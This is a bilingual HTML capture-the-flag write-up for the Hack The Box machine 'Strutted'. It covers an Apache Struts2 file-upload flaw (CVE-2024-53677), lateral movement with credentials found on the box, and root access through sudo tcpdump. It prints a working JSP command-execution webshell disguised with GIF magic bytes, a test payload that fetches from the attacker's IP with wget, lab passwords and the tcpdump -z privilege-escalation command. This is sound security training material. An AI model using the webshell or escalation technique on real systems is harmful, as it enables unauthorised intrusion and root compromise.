@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>strutted | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">strutted</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Java web application with Apache Struts2, vulnerable to CVE-2024-53677, a file upload vulnerability that allows arbitrary file uploads through path traversal. By exploiting this vulnerability in the <code>FileUploadInterceptor</code> class, I was able to bypass weak image validation checks that only verified magic bytes and content type, allowing me to upload a JSP webshell to the web root directory.</p>
+                    
+                    <p>After obtaining initial access as the <code>tomcat</code> user through the webshell, I discovered SSH credentials for the user <code>james</code> in application configuration files. These credentials allowed lateral movement to the james account, which belonged to the sudo group.</p>
+                    
+                    <p>Privilege escalation was achieved by exploiting sudo permissions on the <code>tcpdump</code> binary. Using tcpdump's postrotate-command feature with the <code>-z</code> flag, I was able to execute arbitrary commands as root through blind command injection, reading the root flag by redirecting command output to accessible files.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Apache Struts2 file upload vulnerability (CVE-2024-53677), FileUploadInterceptor path traversal, JSP webshell, tcpdump privilege escalation via sudo misconfiguration.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" /></p>
+
+                <p>The scan reveals SSH on port 22 and an HTTP service on port 80. I add the hostname <code>strutted.htb</code> to my <code>/etc/hosts</code> file for proper domain resolution.</p>
+
+                <h2>Web Enumeration - Image Upload Application</h2>
+                <p>Navigating to the web server, I encounter a typical image upload application. Interestingly, there's an option to download the source code, which I immediately do to begin code analysis.</p>
+
+                <h3>Source Code Analysis</h3>
+                <p>While inspecting the downloaded source code, I find credentials in one of the configuration files in the root directory:</p>
+
+                <pre><code class="language-xml">&lt;tomcat-users&gt;
+    &lt;role rolename="manager-gui"/&gt;
+    &lt;role rolename="admin-gui"/&gt;
+    &lt;user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/&gt;
+&lt;/tomcat-users&gt;</code></pre>
+
+                <p>These credentials don't work for SSH access, and the typical Tomcat manager paths (<code>/manager-gui</code> or <code>/admin-gui</code>) don't exist on this server.</p>
+
+                <h3>Application Dependencies</h3>
+                <p>The application is a Java backend with the following key dependencies:</p>
+                <p><img src="./media/image6.png" alt="Application dependencies showing Struts2 core and other Java libraries" /></p>
+
+                <p>Reviewing the image upload code, I notice it uses weak prevention methods, only checking the content-type header and magic bytes of uploaded images—both of which can be easily manipulated.</p>
+
+                <h3>Understanding the Upload Mechanism</h3>
+                <p>When an image is uploaded, it's stored in two locations:</p>
+                <ul>
+                    <li>The standard uploads directory: <code>http://strutted.htb/uploads/20250928_211001/potato.jpeg</code></li>
+                    <li>A shortlink that displays the image directly on the site: <code>http://strutted.htb/s/59b67e0b</code></li>
+                </ul>
+
+                <p>The shortlink functionality is particularly interesting as it serves the uploaded content through the application itself.</p>
+
+                <h2>Initial Exploitation Attempts</h2>
+                <p>Not knowing initially how to leverage a file upload vulnerability in a Java backend, I begin researching various techniques.</p>
+
+                <h3>Steganography Approach</h3>
+                <p>I first attempt to embed malicious JSP code within an image using steganography:</p>
+
+                <pre><code class="language-jsp">GIF89a;
+&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+    Process p = Runtime.getRuntime().exec("wget 10.10.14.239");
+    OutputStream os = p.getOutputStream();
+    InputStream in = p.getInputStream();
+    int c;
+    while ((c = in.read()) != -1) {
+        out.print((char)c);
+    }
+    in.close();
+%&gt;</code></pre>
+
+                <pre><code class="language-bash">steghide embed -ef test.jsp -cf dog2.jpeg
+Enter passphrase:
+Re-Enter passphrase:
+embedding "test.jsp" in "dog2.jpeg"... done</code></pre>
+
+                <p>Unfortunately, uploading this image doesn't trigger code execution—my Python HTTP server listening on port 80 receives no connections.</p>
+
+                <p>I also try creating a JSP file with GIF magic bytes (<code>GIF89a</code>) prepended, but this approach also fails to execute the embedded code.</p>
+
+                <h3>Virtual Host Enumeration</h3>
+                <p>I perform a virtual host scan but find nothing additional.</p>
+
+                <h2>Vulnerability Research - CVE-2024-53677</h2>
+                <p>Reviewing the versions of the dependencies more carefully, I discover that <code>struts2-core</code> versions below 7.0.0 are vulnerable to remote code execution (CVE-2024-53677) if certain file upload conditions are met in the code.</p>
+
+                <p>Reference: <a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTRUTS-8496612">https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTRUTS-8496612</a></p>
+
+                <p>I find a proof-of-concept exploit on GitHub: <a href="https://github.com/EQSTLab/CVE-2024-53677">https://github.com/EQSTLab/CVE-2024-53677</a></p>
+
+                <h3>Understanding the Struts2 Vulnerability</h3>
+                <p>The vulnerability exploits the <code>FileUploadInterceptor</code> class in the Struts2 framework. This class intercepts and processes file uploads where input fields have specific names:</p>
+                <ul>
+                    <li><code>Upload</code> - for the actual file payload</li>
+                    <li><code>uploadFileName</code> - to specify the filename</li>
+                </ul>
+
+                <p>The critical flaw is that <code>uploadFileName</code> is vulnerable to path traversal, allowing an attacker to control where the uploaded file is saved on the server.</p>
+
+                <p>Combined with the weak validation (only checking filename and magic bytes), this creates a perfect storm for arbitrary file upload and remote code execution.</p>
+
+                <h2>Exploiting CVE-2024-53677 - Manual Approach</h2>
+                <p>The public exploit doesn't work directly on this machine because it wasn't designed for an image upload application that validates magic bytes. However, the underlying vulnerability is present, so I exploit it manually using Burp Suite.</p>
+
+                <h3>Crafting the Malicious JSP Webshell</h3>
+                <p>After several tests comparing my requests with the PoC exploit, I craft a JSP webshell that bypasses the application's defenses:</p>
+
+                <pre><code class="language-jsp">GIF89a;
+&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        int c;
+        while ((c = in.read()) != -1) {
+            out.print((char)c);
+        }
+        in.close();
+    }
+%&gt;</code></pre>
+
+                <p>The key elements of this payload:</p>
+                <ul>
+                    <li><code>GIF89a;</code> - Magic bytes to pass the image validation</li>
+                    <li>JSP code that accepts a <code>cmd</code> parameter and executes it</li>
+                    <li>Output is captured and displayed in the HTTP response</li>
+                </ul>
+
+                <h3>Uploading the Webshell via Burp Suite</h3>
+                <p>Using Burp Suite, I modify the upload request to exploit the path traversal vulnerability in <code>uploadFileName</code>:</p>
+                <p><img src="./media/image7.png" alt="Burp Suite request showing the malicious file upload with path traversal in uploadFileName parameter" /></p>
+
+                <p>The exploit works by:</p>
+                <ol>
+                    <li>Setting the field name to <code>Upload</code> to trigger the FileUploadInterceptor</li>
+                    <li>Using path traversal in <code>uploadFileName</code> to save the file to the web root</li>
+                    <li>Including GIF magic bytes to bypass content validation</li>
+                    <li>Embedding executable JSP code after the magic bytes</li>
+                </ol>
+
+                <h3>Webshell Access</h3>
+                <p>After successfully uploading the file, I can access the webshell and execute commands:</p>
+                <p><img src="./media/image1.png" alt="Successful webshell execution showing command output in the browser" /></p>
+
+                <p>The webshell is now accessible at the root of the web application, allowing me to execute arbitrary commands through the <code>cmd</code> parameter.</p>
+
+                <h2>Initial Access - Reverse Shell</h2>
+                <p>With command execution capabilities, I establish a reverse shell to gain interactive access to the system. Using the webshell, I execute a reverse shell payload that connects back to my netcat listener.</p>
+
+                <p>I successfully obtain a shell as the <code>tomcat</code> user.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <h3>User Discovery</h3>
+                <p>Exploring the <code>/home</code> directory, I discover a user named <code>james</code>. I test the credentials found earlier (<code>admin:skqKY6360z!Y</code>) for both james and root, but they don't work.</p>
+
+                <h3>Additional Credentials</h3>
+                <p>Continuing to search through application files, I find another set of credentials:</p>
+                <pre><code class="language-xml">&lt;user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/&gt;</code></pre>
+
+                <p>These also don't work for <code>su</code> commands to james or root.</p>
+
+                <h3>Network Service Discovery</h3>
+                <p>Using <code>ss -tuln</code>, I discover an application running locally on port 8080. I set up chisel for local port forwarding to investigate, but it turns out to be the same application from port 80, just accessed through a reverse proxy.</p>
+
+                <h3>User Group Analysis</h3>
+                <p>Checking user permissions, I notice something interesting:</p>
+                <pre><code class="language-bash">tomcat@strutted:~$ id james
+uid=1000(james) gid=1000(james) groups=1000(james),27(sudo)</code></pre>
+
+                <p>The user <code>james</code> is in the <code>sudo</code> group, making this account a prime target for lateral movement.</p>
+
+                <h2>Lateral Movement - SSH Access as James</h2>
+                <p>With no other leads immediately apparent, I try a different approach. Instead of using <code>su</code> to switch users, I attempt SSH access as james using the password <code>IT14d6SSP81k</code>.</p>
+
+                <p>Success! The password works for SSH authentication:</p>
+                <p><img src="./media/image2.png" alt="Successful SSH login as james and retrieval of user flag" /></p>
+
+                <p>I now have proper shell access as <code>james</code> and can retrieve the user flag.</p>
+
+                <h2>Privilege Escalation - Sudo Tcpdump</h2>
+                <p>Checking sudo privileges for the james user:</p>
+
+                <pre><code class="language-bash">james@strutted:~$ sudo -l
+Matching Defaults entries for james on localhost:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
+    use_pty
+
+User james may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/sbin/tcpdump</code></pre>
+
+                <p>The user can run <code>tcpdump</code> as root without a password—this is a known privilege escalation vector.</p>
+
+                <h3>Understanding the Tcpdump Privilege Escalation</h3>
+                <p>According to GTFOBins (<a href="https://gtfobins.github.io/gtfobins/tcpdump/#sudo">https://gtfobins.github.io/gtfobins/tcpdump/#sudo</a>), tcpdump doesn't drop privileges when run with sudo and can be exploited to execute arbitrary commands as root.</p>
+
+                <p>The attack leverages tcpdump's <code>-z</code> flag, which runs a command after rotating capture files. Since tcpdump runs as root, any command executed through this flag will also run with root privileges.</p>
+
+                <h3>Blind Command Injection</h3>
+                <p>The standard GTFOBins example doesn't produce direct output, but I can verify root execution by having commands write to files. Testing confirms that files created this way are owned by root, proving the vulnerability is exploitable through blind command injection.</p>
+
+                <h3>Extracting the Root Flag</h3>
+                <p>I craft a command that reads the root flag and redirects the output to a file I can access:</p>
+                <p><img src="./media/image4.png" alt="Tcpdump command using the -z flag for privilege escalation and command execution" /></p>
+
+                <p>The command structure:</p>
+                <pre><code class="language-bash">sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/privesc.sh</code></pre>
+
+                <p>Where <code>privesc.sh</code> contains commands to read <code>/root/root.txt</code> and write it to an accessible location.</p>
+
+                <p>Successfully reading the root flag:</p>
+                <p><img src="./media/image5.png" alt="Successfully obtained root flag content" /></p>
+
+                <p>Through this blind command injection technique with tcpdump's postrotate command feature, I achieve privilege escalation and complete the machine by obtaining the root flag.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web Java con Apache Struts2, vulnerable a CVE-2024-53677, una vulnerabilidad de subida de archivos que permite cargas arbitrarias mediante path traversal. Explotando esta vulnerabilidad en la clase <code>FileUploadInterceptor</code>, pude saltarme las débiles comprobaciones de validación de imágenes que solo verificaban magic bytes y content-type, permitiéndome subir una webshell JSP al directorio raíz de la web.</p>
+                    
+                    <p>Tras obtener acceso inicial como usuario <code>tomcat</code> mediante la webshell, descubrí credenciales SSH para el usuario <code>james</code> en archivos de configuración de la aplicación. Estas credenciales permitieron movimiento lateral a la cuenta de james, que pertenecía al grupo sudo.</p>
+                    
+                    <p>La escalada de privilegios se logró explotando permisos sudo sobre el binario <code>tcpdump</code>. Usando la característica postrotate-command de tcpdump con el flag <code>-z</code>, pude ejecutar comandos arbitrarios como root mediante inyección de comandos a ciegas, leyendo la flag de root redirigiendo la salida de comandos a archivos accesibles.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Vulnerabilidad de subida de archivos en Apache Struts2 (CVE-2024-53677), path traversal en FileUploadInterceptor, webshell JSP, escalada de privilegios con tcpdump mediante mala configuración de sudo.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" /></p>
+
+                <p>El escaneo revela SSH en el puerto 22 y un servicio HTTP en el puerto 80. Añado el hostname <code>strutted.htb</code> a mi fichero <code>/etc/hosts</code> para una resolución de dominio adecuada.</p>
+
+                <h2>Enumeración Web - Aplicación de Subida de Imágenes</h2>
+                <p>Navegando al servidor web, encuentro una típica aplicación de subida de imágenes. Curiosamente, hay una opción para descargar el código fuente, lo cual hago inmediatamente para comenzar el análisis de código.</p>
+
+                <h3>Análisis del Código Fuente</h3>
+                <p>Mientras inspecciono el código fuente descargado, encuentro credenciales en uno de los archivos de configuración en el directorio raíz:</p>
+
+                <pre><code class="language-xml">&lt;tomcat-users&gt;
+    &lt;role rolename="manager-gui"/&gt;
+    &lt;role rolename="admin-gui"/&gt;
+    &lt;user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/&gt;
+&lt;/tomcat-users&gt;</code></pre>
+
+                <p>Estas credenciales no funcionan para acceso SSH, y las rutas típicas del gestor de Tomcat (<code>/manager-gui</code> o <code>/admin-gui</code>) no existen en este servidor.</p>
+
+                <h3>Dependencias de la Aplicación</h3>
+                <p>La aplicación es un backend Java con las siguientes dependencias clave:</p>
+                <p><img src="./media/image6.png" alt="Dependencias de la aplicación mostrando Struts2 core y otras librerías Java" /></p>
+
+                <p>Revisando el código de subida de imágenes, noto que usa métodos de prevención débiles, comprobando solo la cabecera content-type y los magic bytes de las imágenes subidas—ambas cosas pueden manipularse fácilmente.</p>
+
+                <h3>Entendiendo el Mecanismo de Subida</h3>
+                <p>Cuando se sube una imagen, se almacena en dos ubicaciones:</p>
+                <ul>
+                    <li>El directorio estándar de subidas: <code>http://strutted.htb/uploads/20250928_211001/potato.jpeg</code></li>
+                    <li>Un shortlink que muestra la imagen directamente en el sitio: <code>http://strutted.htb/s/59b67e0b</code></li>
+                </ul>
+
+                <p>La funcionalidad del shortlink es particularmente interesante ya que sirve el contenido subido a través de la propia aplicación.</p>
+
+                <h2>Intentos Iniciales de Explotación</h2>
+                <p>Sin saber inicialmente cómo aprovechar una vulnerabilidad de subida de archivos en un backend Java, comienzo investigando varias técnicas.</p>
+
+                <h3>Enfoque con Esteganografía</h3>
+                <p>Primero intento incrustar código JSP malicioso dentro de una imagen usando esteganografía:</p>
+
+                <pre><code class="language-jsp">GIF89a;
+&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+    Process p = Runtime.getRuntime().exec("wget 10.10.14.239");
+    OutputStream os = p.getOutputStream();
+    InputStream in = p.getInputStream();
+    int c;
+    while ((c = in.read()) != -1) {
+        out.print((char)c);
+    }
+    in.close();
+%&gt;</code></pre>
+
+                <pre><code class="language-bash">steghide embed -ef test.jsp -cf dog2.jpeg
+Enter passphrase:
+Re-Enter passphrase:
+embedding "test.jsp" in "dog2.jpeg"... done</code></pre>
+
+                <p>Desafortunadamente, subir esta imagen no desencadena la ejecución de código—mi servidor HTTP Python escuchando en el puerto 80 no recibe conexiones.</p>
+
+                <p>También pruebo crear un archivo JSP con magic bytes GIF (<code>GIF89a</code>) antepuestos, pero este enfoque también falla en ejecutar el código incrustado.</p>
+
+                <h3>Enumeración de Hosts Virtuales</h3>
+                <p>Realizo un escaneo de hosts virtuales pero no encuentro nada adicional.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2024-53677</h2>
+                <p>Revisando las versiones de las dependencias más cuidadosamente, descubro que las versiones de <code>struts2-core</code> por debajo de 7.0.0 son vulnerables a ejecución remota de código (CVE-2024-53677) si se cumplen ciertas condiciones de subida de archivos en el código.</p>
+
+                <p>Referencia: <a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTRUTS-8496612">https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHESTRUTS-8496612</a></p>
+
+                <p>Encuentro una prueba de concepto del exploit en GitHub: <a href="https://github.com/EQSTLab/CVE-2024-53677">https://github.com/EQSTLab/CVE-2024-53677</a></p>
+
+                <h3>Entendiendo la Vulnerabilidad de Struts2</h3>
+                <p>La vulnerabilidad explota la clase <code>FileUploadInterceptor</code> en el framework Struts2. Esta clase intercepta y procesa subidas de archivos donde los campos de entrada tienen nombres específicos:</p>
+                <ul>
+                    <li><code>Upload</code> - para el payload del archivo en sí</li>
+                    <li><code>uploadFileName</code> - para especificar el nombre del archivo</li>
+                </ul>
+
+                <p>El fallo crítico es que <code>uploadFileName</code> es vulnerable a path traversal, permitiendo a un atacante controlar dónde se guarda el archivo subido en el servidor.</p>
+
+                <p>Combinado con la validación débil (solo comprobando nombre de archivo y magic bytes), esto crea la tormenta perfecta para subida arbitraria de archivos y ejecución remota de código.</p>
+
+                <h2>Explotando CVE-2024-53677 - Enfoque Manual</h2>
+                <p>El exploit público no funciona directamente en esta máquina porque no estaba diseñado para una aplicación de subida de imágenes que valida magic bytes. Sin embargo, la vulnerabilidad subyacente está presente, así que la exploto manualmente usando Burp Suite.</p>
+
+                <h3>Creando la Webshell JSP Maliciosa</h3>
+                <p>Después de varias pruebas comparando mis peticiones con el PoC del exploit, creo una webshell JSP que sortea las defensas de la aplicación:</p>
+
+                <pre><code class="language-jsp">GIF89a;
+&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+    String cmd = request.getParameter("cmd");
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        int c;
+        while ((c = in.read()) != -1) {
+            out.print((char)c);
+        }
+        in.close();
+    }
+%&gt;</code></pre>
+
+                <p>Los elementos clave de este payload:</p>
+                <ul>
+                    <li><code>GIF89a;</code> - Magic bytes para pasar la validación de imágenes</li>
+                    <li>Código JSP que acepta un parámetro <code>cmd</code> y lo ejecuta</li>
+                    <li>La salida se captura y muestra en la respuesta HTTP</li>
+                </ul>
+
+                <h3>Subiendo la Webshell mediante Burp Suite</h3>
+                <p>Usando Burp Suite, modifico la petición de subida para explotar la vulnerabilidad de path traversal en <code>uploadFileName</code>:</p>
+                <p><img src="./media/image7.png" alt="Petición de Burp Suite mostrando la subida maliciosa con path traversal en el parámetro uploadFileName" /></p>
+
+                <p>El exploit funciona mediante:</p>
+                <ol>
+                    <li>Establecer el nombre del campo como <code>Upload</code> para activar el FileUploadInterceptor</li>
+                    <li>Usar path traversal en <code>uploadFileName</code> para guardar el archivo en la raíz web</li>
+                    <li>Incluir magic bytes GIF para sortear la validación de contenido</li>
+                    <li>Incrustar código JSP ejecutable después de los magic bytes</li>
+                </ol>
+
+                <h3>Acceso a la Webshell</h3>
+                <p>Después de subir exitosamente el archivo, puedo acceder a la webshell y ejecutar comandos:</p>
+                <p><img src="./media/image1.png" alt="Ejecución exitosa de la webshell mostrando salida de comandos en el navegador" /></p>
+
+                <p>La webshell ahora es accesible en la raíz de la aplicación web, permitiéndome ejecutar comandos arbitrarios mediante el parámetro <code>cmd</code>.</p>
+
+                <h2>Acceso Inicial - Reverse Shell</h2>
+                <p>Con capacidades de ejecución de comandos, establezco una reverse shell para obtener acceso interactivo al sistema. Usando la webshell, ejecuto un payload de reverse shell que se conecta de vuelta a mi listener de netcat.</p>
+
+                <p>Obtengo exitosamente una shell como usuario <code>tomcat</code>.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <h3>Descubrimiento de Usuarios</h3>
+                <p>Explorando el directorio <code>/home</code>, descubro un usuario llamado <code>james</code>. Pruebo las credenciales encontradas anteriormente (<code>admin:skqKY6360z!Y</code>) para james y root, pero no funcionan.</p>
+
+                <h3>Credenciales Adicionales</h3>
+                <p>Continuando la búsqueda por archivos de la aplicación, encuentro otro conjunto de credenciales:</p>
+                <pre><code class="language-xml">&lt;user username="admin" password="IT14d6SSP81k" roles="manager-gui,admin-gui"/&gt;</code></pre>
+
+                <p>Estas tampoco funcionan para comandos <code>su</code> a james o root.</p>
+
+                <h3>Descubrimiento de Servicios de Red</h3>
+                <p>Usando <code>ss -tuln</code>, descubro una aplicación ejecutándose localmente en el puerto 8080. Configuro chisel para local port forwarding para investigar, pero resulta ser la misma aplicación del puerto 80, solo accedida mediante un proxy inverso.</p>
+
+                <h3>Análisis de Grupos de Usuarios</h3>
+                <p>Comprobando permisos de usuarios, noto algo interesante:</p>
+                <pre><code class="language-bash">tomcat@strutted:~$ id james
+uid=1000(james) gid=1000(james) groups=1000(james),27(sudo)</code></pre>
+
+                <p>El usuario <code>james</code> está en el grupo <code>sudo</code>, haciendo de esta cuenta un objetivo prioritario para movimiento lateral.</p>
+
+                <h2>Movimiento Lateral - Acceso SSH como James</h2>
+                <p>Sin otras pistas inmediatamente aparentes, pruebo un enfoque diferente. En lugar de usar <code>su</code> para cambiar de usuarios, intento acceso SSH como james usando la contraseña <code>IT14d6SSP81k</code>.</p>
+
+                <p>¡Éxito! La contraseña funciona para autenticación SSH:</p>
+                <p><img src="./media/image2.png" alt="Login SSH exitoso como james y recuperación de la flag de usuario" /></p>
+
+                <p>Ahora tengo acceso shell propio como <code>james</code> y puedo recuperar la flag de usuario.</p>
+
+                <h2>Escalada de Privilegios - Sudo Tcpdump</h2>
+                <p>Comprobando privilegios sudo para el usuario james:</p>
+
+                <pre><code class="language-bash">james@strutted:~$ sudo -l
+Matching Defaults entries for james on localhost:
+    env_reset, mail_badpass, 
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, 
+    use_pty
+
+User james may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/sbin/tcpdump</code></pre>
+
+                <p>El usuario puede ejecutar <code>tcpdump</code> como root sin contraseña—este es un vector conocido de escalada de privilegios.</p>
+
+                <h3>Entendiendo la Escalada de Privilegios con Tcpdump</h3>
+                <p>Según GTFOBins (<a href="https://gtfobins.github.io/gtfobins/tcpdump/#sudo">https://gtfobins.github.io/gtfobins/tcpdump/#sudo</a>), tcpdump no libera privilegios cuando se ejecuta con sudo y puede explotarse para ejecutar comandos arbitrarios como root.</p>
+
+                <p>El ataque aprovecha el flag <code>-z</code> de tcpdump, que ejecuta un comando después de rotar archivos de captura. Como tcpdump se ejecuta como root, cualquier comando ejecutado mediante este flag también se ejecutará con privilegios de root.</p>
+
+                <h3>Inyección de Comandos a Ciegas</h3>
+                <p>El ejemplo estándar de GTFOBins no produce salida directa, pero puedo verificar la ejecución como root haciendo que los comandos escriban en archivos. Las pruebas confirman que los archivos creados de esta manera son propiedad de root, demostrando que la vulnerabilidad es explotable mediante inyección de comandos a ciegas.</p>
+
+                <h3>Extrayendo la Flag de Root</h3>
+                <p>Creo un comando que lee la flag de root y redirige la salida a un archivo al que puedo acceder:</p>
+                <p><img src="./media/image4.png" alt="Comando tcpdump usando el flag -z para escalada de privilegios y ejecución de comandos" /></p>
+
+                <p>La estructura del comando:</p>
+                <pre><code class="language-bash">sudo tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/privesc.sh</code></pre>
+
+                <p>Donde <code>privesc.sh</code> contiene comandos para leer <code>/root/root.txt</code> y escribirlo en una ubicación accesible.</p>
+
+                <p>Leyendo exitosamente la flag de root:</p>
+                <p><img src="./media/image5.png" alt="Contenido de la flag de root obtenido exitosamente" /></p>
+
+                <p>Mediante esta técnica de inyección de comandos a ciegas con la característica postrotate command de tcpdump, logro la escalada de privilegios y completo la máquina obteniendo la flag de root.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
